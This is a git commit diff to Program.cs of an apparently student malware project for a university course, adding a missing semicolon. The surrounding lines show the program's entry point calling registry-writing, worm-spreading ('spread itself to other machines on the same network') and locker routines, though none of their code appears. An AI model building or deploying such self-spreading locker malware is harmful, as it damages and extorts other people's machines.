5472d3e7a5617b0f7f07d63bdd20e36e3e2ef393
peroxidee <iluvwerewolves333@gmail.com>
2024-07-25 15:41:08 -0700

    add ;

--- Program.cs
+++ Program.cs
@@ -16,7 +16,7 @@ public class Program
         Console.WriteLine(" \\  `-) )| | \\  `-) )| |  |)|( `-'  ) ");
         Console.WriteLine(" )\\____/ `-' )\\____/ |_|  (_) `----'  ");
         Console.WriteLine(" (__)        (__)                      ");
-      Console.WriteLine("")
+        Console.WriteLine("");
         Console.WriteLine("[*] created by : peroxidee / 0xilvwrlvs");
             Console.WriteLine("[*] malware for malware.dev.ciso.csusb(2024[fall]sem)");
         RegEdit.Write();
@@ -26,8 +26,6 @@ public class Program
         Worms.Entrypoint(args[1]);
         // attempt to spread itself to other machines on the same network.
         
-        
-
         Locker.Pos();
 
     }
